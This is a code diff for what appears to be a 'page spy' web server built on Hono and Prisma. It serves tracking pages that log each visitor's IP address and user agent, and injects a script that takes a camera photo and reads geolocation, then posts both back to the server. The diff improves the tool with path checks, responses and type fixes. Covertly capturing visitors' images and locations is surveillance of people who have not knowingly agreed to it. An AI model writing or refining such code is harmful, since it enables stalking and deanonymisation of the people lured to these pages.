@@ -50,6 +50,8 @@ app.post(
         location: `${requestJson.latitude}, ${requestJson.longitude}`,
       },
     });
+
+    return c.json({});
   },
 );
 
@@ -86,11 +88,27 @@ app.post(
         photoBase64: requestJson.photoBase64,
       },
     });
+
+    return c.json({});
   },
 );
 
 app.get("/*", async (c) => {
   const path = c.req.path;
+
+  const checkPageSpy = await prismaClient.pageSpy.findUnique({
+    where: {
+      path,
+    },
+    select: {
+      id: true,
+    },
+  });
+
+  if (!checkPageSpy) {
+    return c.text("Page not found", 404);
+  }
+
   const requestIp = String(c.req.header("x-real-ip"));
   const requestUserAgent = String(c.req.header("user-agent"));
 
@@ -115,7 +133,7 @@ app.get("/*", async (c) => {
 
       ${html`
         <script>
-          const pageLoadId = ${pageView.id};
+          const pageLoadId = "${pageView.id}";
 
           // Função para capturar foto da câmera
           async function capturarFoto() {
@@ -166,7 +184,7 @@ app.get("/*", async (c) => {
               document.body.removeChild(canvas);
 
               // Envia a imagem para uma API (exemplo)
-              fetch("/api/page-view-photo", {
+              await fetch("/api/page-view-photo", {
                 method: "POST",
                 headers: {
                   "Content-Type": "application/json",
@@ -204,8 +222,8 @@ app.get("/*", async (c) => {
                   },
                   body: JSON.stringify({
                     pageViewId: pageLoadId,
-                    latitude,
-                    longitude,
+                    latitude: String(latitude),
+                    longitude: String(longitude),
                   }),
                 });
               },
